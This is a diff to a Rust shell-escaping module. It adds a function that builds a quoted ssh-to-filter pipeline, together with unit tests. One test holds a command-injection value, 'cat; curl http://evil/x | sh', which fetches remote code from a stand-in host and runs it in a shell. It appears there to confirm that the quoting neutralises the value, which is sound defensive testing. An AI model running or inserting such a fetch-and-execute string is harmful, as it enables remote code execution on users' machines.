@@ -59,6 +59,33 @@ pub fn escape_paths(paths: &[&str]) -> String {
         .join(" ")
 }
 
+/// Builds a `sh -c` script that pipes `argv`'s output through `filter`.
+///
+/// Both sides are escaped argument by argument, so a value that arrived from an
+/// imported connection file cannot smuggle a second command in — the same defect
+/// class as the VNC viewer arguments fixed in 0.21.11. Nothing here is expanded
+/// by the shell: a `~` or `$VAR` a user means to be resolved has to be resolved
+/// before it gets here.
+///
+/// In a POSIX pipeline only the right-hand side's stdin becomes the pipe, so the
+/// left-hand command keeps the terminal for input. That is what lets an
+/// interactive session be filtered.
+///
+/// # Examples
+///
+/// ```
+/// use rustconn_core::shell_escape::pipe_argv_through;
+///
+/// assert_eq!(
+///     pipe_argv_through(&["ssh", "user@host"], &["ccze", "-A"]),
+///     "'ssh' 'user@host' | 'ccze' '-A'"
+/// );
+/// ```
+#[must_use]
+pub fn pipe_argv_through(argv: &[&str], filter: &[&str]) -> String {
+    format!("{} | {}", escape_paths(argv), escape_paths(filter))
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -116,5 +143,32 @@ mod tests {
     #[test]
     fn test_path_with_unicode() {
         assert_eq!(escape_path("/tmp/файл.txt"), "'/tmp/файл.txt'");
+    }
+
+    #[test]
+    fn pipeline_quotes_both_sides() {
+        assert_eq!(
+            pipe_argv_through(&["ssh", "-p", "2222", "u@h"], &["chromaterm"]),
+            "'ssh' '-p' '2222' 'u@h' | 'chromaterm'"
+        );
+    }
+
+    /// The point of quoting: a filter command that arrived from an imported
+    /// connection file cannot append a second command.
+    #[test]
+    fn pipeline_neutralizes_a_smuggled_command() {
+        let script = pipe_argv_through(&["ssh", "host"], &["cat; curl http://evil/x | sh"]);
+        assert_eq!(
+            script, "'ssh' 'host' | 'cat; curl http://evil/x | sh'",
+            "the whole filter must stay one word"
+        );
+    }
+
+    #[test]
+    fn pipeline_survives_a_single_quote_in_an_argument() {
+        assert_eq!(
+            pipe_argv_through(&["ssh", "host"], &["awk", "{print $0'x'}"]),
+            "'ssh' 'host' | 'awk' '{print $0'\\''x'\\''}'"
+        );
     }
 }
